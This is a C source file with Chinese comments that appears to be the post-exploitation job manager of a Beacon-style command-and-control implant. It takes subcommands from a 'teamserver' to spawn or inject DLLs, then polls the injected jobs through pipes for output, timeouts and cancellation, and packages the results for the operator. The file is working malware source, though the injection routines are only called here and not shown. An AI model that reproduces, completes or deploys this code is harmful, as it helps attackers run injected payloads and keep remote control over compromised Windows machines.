#include "postex_internal.h"

typedef struct PostExPollItem {
    PostExJob job;
} PostExPollItem;

/* 为 poll 快照复制句柄，避免持锁期间阻塞读取 pipe。 */
static BOOL PostExDuplicateHandleForPoll(HANDLE src, HANDLE* dst)
{
    HANDLE self;

    if (!dst) return FALSE;
    *dst = NULL;
    if (!src || src == INVALID_HANDLE_VALUE) return TRUE;

    self = GetCurrentProcess();
    if (!DuplicateHandle(self, src, self, dst, 0, FALSE,
                         DUPLICATE_SAME_ACCESS)) {
        *dst = NULL;
        return FALSE;
    }
    return TRUE;
}

/* 关闭 poll 快照中复制出来的临时句柄。 */
static VOID PostExClosePollItem(PostExPollItem* item)
{
    if (!item) return;
    if (item->job.pipe && item->job.pipe != INVALID_HANDLE_VALUE) {
        CloseHandle(item->job.pipe);
        item->job.pipe = INVALID_HANDLE_VALUE;
    }
    if (item->job.process) {
        CloseHandle(item->job.process);
        item->job.process = NULL;
    }
}

/* 对当前 job 列表做轻量快照，poll 阶段只操作复制句柄。 */
static SIZE_T PostExSnapshotJobs(PostExManager* pm,
                                 PostExPollItem* items,
                                 SIZE_T max_items)
{
    PostExJob* cur;
    SIZE_T count = 0;

    if (!pm || !items || max_items == 0) return 0;

    EnterCriticalSection(&pm->lock);
    for (cur = pm->jobs; cur && count < max_items; cur = cur->next) {
        PostExPollItem* item = &items[count];

        ZeroMemory(item, sizeof(*item));
        item->job = *cur;
        item->job.next = NULL;
        item->job.pipe = INVALID_HANDLE_VALUE;
        item->job.process = NULL;
        item->job.remote_thread = NULL;
        item->job.remote_image = NULL;
        item->job.remote_config = NULL;

        if (!PostExDuplicateHandleForPoll(cur->pipe, &item->job.pipe)) {
            PostExClosePollItem(item);
            continue;
        }
        if (!PostExDuplicateHandleForPoll(cur->process, &item->job.process)) {
            PostExClosePollItem(item);
            continue;
        }
        ++count;
    }
    LeaveCriticalSection(&pm->lock);
    return count;
}

/* 从真实 job 列表摘除指定 job，调用方获得所有权。 */
static PostExJob* PostExDetachForPoll(PostExManager* pm, UINT32 job_id)
{
    PostExJob* job;

    EnterCriticalSection(&pm->lock);
    job = PostExDetachLocked(pm, job_id);
    LeaveCriticalSection(&pm->lock);
    return job;
}

/* 把真实 job 的取消状态同步到 poll 快照。 */
static VOID PostExCopyCancelState(PostExJob* dst, const PostExJob* src)
{
    if (!dst || !src) return;
    dst->cancel_requested = src->cancel_requested;
    dst->cancel_reason = src->cancel_reason;
    dst->cancel_requested_tick = src->cancel_requested_tick;
}

/* 记录 job 活动时间，并刷新快照中的取消状态。 */
static VOID PostExTouchActivityForPoll(PostExManager* pm,
                                       PostExJob* snapshot,
                                       ULONGLONG now)
{
    PostExJob* job;

    if (!pm || !snapshot) return;

    EnterCriticalSection(&pm->lock);
    job = PostExFindLocked(pm, snapshot->job_id);
    if (job) {
        PostExTouchJobActivityLocked(job, now);
        snapshot->last_activity_tick = job->last_activity_tick;
        PostExCopyCancelState(snapshot, job);
    }
    LeaveCriticalSection(&pm->lock);
}

/* 从 poll 路径请求取消真实 job。 */
static BOOL PostExRequestCancelForPoll(PostExManager* pm,
                                       PostExJob* snapshot,
                                       UINT32 reason,
                                       ULONGLONG now)
{
    PostExJob* job;
    BOOL found = FALSE;

    if (!pm || !snapshot) return FALSE;

    EnterCriticalSection(&pm->lock);
    job = PostExFindLocked(pm, snapshot->job_id);
    if (job) {
        PostExRequestCancelLocked(job, reason, now, NULL);
        PostExCopyCancelState(snapshot, job);
        found = TRUE;
    }
    LeaveCriticalSection(&pm->lock);
    return found;
}

/* 根据 max_runtime/idle_timeout 对 job 应用 watchdog 取消策略。 */
static VOID PostExApplyWatchdog(PostExManager* pm, PostExJob* job,
                                ULONGLONG now)
{
    if (!pm || !job || job->cancel_requested) return;

    if (job->max_runtime_ms && job->started_tick &&
        now - job->started_tick >= job->max_runtime_ms) {
        PostExRequestCancelForPoll(pm, job, POSTEX_CANCEL_REASON_TIMEOUT, now);
        return;
    }

    if (job->idle_timeout_ms && job->last_activity_tick &&
        now - job->last_activity_tick >= job->idle_timeout_ms) {
        PostExRequestCancelForPoll(pm, job, POSTEX_CANCEL_REASON_IDLE, now);
    }
}

/* 判断取消请求是否已经超过宽限期。 */
static BOOL PostExCancelGraceExpired(const PostExJob* job, ULONGLONG now)
{
    return job &&
           job->cancel_requested &&
           job->cancel_requested_tick &&
           now - job->cancel_requested_tick >= POSTEX_CANCEL_GRACE_MS;
}

/* 根据取消状态规范化 DONE reason。 */
static const CHAR* PostExDoneReason(PostExJob* job, const CHAR* done_reason)
{
    if (job && job->cancel_requested) {
        if (!done_reason || !done_reason[0] ||
            strcmp(done_reason, "done") == 0 ||
            strcmp(done_reason, "cancelled") == 0) {
            return PostExCancelReasonName(job->cancel_reason);
        }
    }
    return done_reason && done_reason[0] ? done_reason : "done";
}

/* 根据取消状态规范化 pipe/process 关闭原因。 */
static const CHAR* PostExClosedReason(PostExJob* job, const CHAR* fallback)
{
    if (job && job->cancel_requested) {
        return PostExCancelReasonName(job->cancel_reason);
    }
    return fallback && fallback[0] ? fallback : "pipe closed";
}

/* 取消宽限期结束后关闭 job，并生成 dead 事件。 */
static BOOL PostExCloseCancelledForPoll(PostExManager* pm,
                                        PostExJob* snapshot,
                                        PacketList* out)
{
    PostExJob* dead;

    if (!pm || !snapshot || !out) return FALSE;
    dead = PostExDetachForPoll(pm, snapshot->job_id);
    if (!dead) return FALSE;

    PostExCopyCancelState(snapshot, dead);
    PlistAdd(out, PostExMakeDead(snapshot,
                                 PostExCancelReasonName(snapshot->cancel_reason)));
    PostExCloseJob(dead, TRUE);
    return TRUE;
}

/* 初始化 PostEx 管理器。 */
VOID PostExInit(PostExManager* pm, struct BeaconContext* ctx)
{
    InitializeCriticalSection(&pm->lock);
    pm->jobs = NULL;
    pm->ctx = ctx;
}

/* 关闭并释放所有 PostEx job。 */
VOID PostExFree(PostExManager* pm)
{
    PostExJob* cur;

    if (!pm) return;

    EnterCriticalSection(&pm->lock);
    cur = pm->jobs;
    pm->jobs = NULL;
    LeaveCriticalSection(&pm->lock);

    while (cur) {
        PostExJob* next = cur->next;
        cur->next = NULL;
        PostExCloseJob(cur, TRUE);
        cur = next;
    }

    DeleteCriticalSection(&pm->lock);
    ZeroMemory(pm, sizeof(*pm));
}

/* 处理 teamserver 下发的 PostEx 子命令。 */
ByteBuf PostExHandle(struct BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    if (!ctx || !parser) return BbFromText("invalid context");

    switch (ParserU32(parser)) {
    case POSTEX_SUBCMD_SPAWN_DLL:
        return PostExSpawnDll(ctx, task_id, parser);
    case POSTEX_SUBCMD_INJECT_DLL:
        return PostExInjectDll(ctx, task_id, parser);
    default:
        break;
    }

    if (parser->error[0]) return BbFromText(parser->error);
    return BbFromText("unknown postex subcommand");
}

/* 轮询所有 PostEx job，读取输出、frame、结束和取消状态。 */
PacketList PostExPoll(PostExManager* pm)
{
    PacketList out;
    PostExPollItem items[POSTEX_MAX_JOBS];
    SIZE_T item_count;
    SIZE_T i;
    UINT32 tick_frames = 0;
    SIZE_T tick_bytes = 0;

    PlistInit(&out);
    out.items_are_final = 1;
    if (!pm) return out;

    /* 快照后无锁 poll，避免长时间持有 jobs lock。 */
    item_count = PostExSnapshotJobs(pm, items, _countof(items));
    for (i = 0; i < item_count; ++i) {
        PostExPollItem* item = &items[i];
        UINT32 job_frames = 0;
        BOOL job_closed = FALSE;
        ULONGLONG now_tick = GetTickCount64();

        /* 每轮先执行运行时长和 idle watchdog。 */
        PostExApplyWatchdog(pm, &item->job, now_tick);

        while (!job_closed &&
               job_frames < POSTEX_POLL_MAX_FRAMES_PER_JOB &&
               tick_frames < POSTEX_POLL_MAX_FRAMES_PER_TICK &&
               tick_bytes < POSTEX_POLL_MAX_BYTES_PER_TICK) {
            ByteBuf data;
            CHAR done_reason[64] = { 0 };
            UINT32 frame_type = 0;
            UINT32 frame_flags = 0;
            UINT32 frame_seq = 0;
            INT rc;

            rc = PostExReadOutput(&item->job, &data, done_reason,
                                  sizeof(done_reason), &frame_type,
                                  &frame_flags, &frame_seq);

            /* 普通文本输出直接变为 POSTEX_EVENT_OUTPUT。 */
            if (rc == POSTEX_READ_OUTPUT) {
                tick_bytes += data.len;
                ++tick_frames;
                ++job_frames;
                PostExTouchActivityForPoll(pm, &item->job, GetTickCount64());
                if (!item->job.cancel_requested) {
                    PlistAdd(&out, PostExMakeOutput(&item->job, &data));
                }
                BbFree(&data);
                continue;
            }

            /* 结构化 frame 保留类型、标志和序号。 */
            if (rc == POSTEX_READ_FRAME) {
                tick_bytes += data.len;
                ++tick_frames;
                ++job_frames;
                PostExTouchActivityForPoll(pm, &item->job, GetTickCount64());
                if (!item->job.cancel_requested ||
                    frame_type != POSTEX_FRAME_TYPE_PROGRESS) {
                    PlistAdd(&out, PostExMakeFrame(&item->job, frame_type,
                                                   frame_flags, frame_seq, &data));
                }
                BbFree(&data);
                continue;
            }

            /* DONE 或 pipe/process 关闭都会摘除真实 job。 */
            if (rc == POSTEX_READ_DONE) {
                PostExJob* dead;

                BbFree(&data);
                dead = PostExDetachForPoll(pm, item->job.job_id);
                if (dead) {
                    PostExCopyCancelState(&item->job, dead);
                    PlistAdd(&out, PostExMakeDead(&item->job,
                             PostExDoneReason(&item->job, done_reason)));
                    PostExCloseJob(dead, TRUE);
                }
                job_closed = TRUE;
                continue;
            }

            if (rc < 0) {
                PostExJob* dead;
                const CHAR* reason;

                BbFree(&data);
                reason = PostExProcessExited(&item->job) ?
                         "process exited" : "pipe closed";
                dead = PostExDetachForPoll(pm, item->job.job_id);
                if (dead) {
                    PostExCopyCancelState(&item->job, dead);
                    PlistAdd(&out, PostExMakeDead(
                        &item->job,
                        PostExClosedReason(&item->job, reason)));
                    PostExCloseJob(dead, TRUE);
                }
                job_closed = TRUE;
                continue;
            }

            BbFree(&data);
            if (item->job.owns_process && PostExProcessExited(&item->job)) {
                PostExJob* dead;

                dead = PostExDetachForPoll(pm, item->job.job_id);
                if (dead) {
                    PostExCopyCancelState(&item->job, dead);
                    PlistAdd(&out, PostExMakeDead(
                        &item->job,
                        PostExClosedReason(&item->job, "process exited")));
                    PostExCloseJob(dead, FALSE);
                }
                job_closed = TRUE;
            } else {
                break;
            }
        }

        if (!job_closed &&
            PostExCancelGraceExpired(&item->job, GetTickCount64())) {
            job_closed = PostExCloseCancelledForPoll(pm, &item->job, &out);
        }

        PostExClosePollItem(item);
    }
    return out;
}
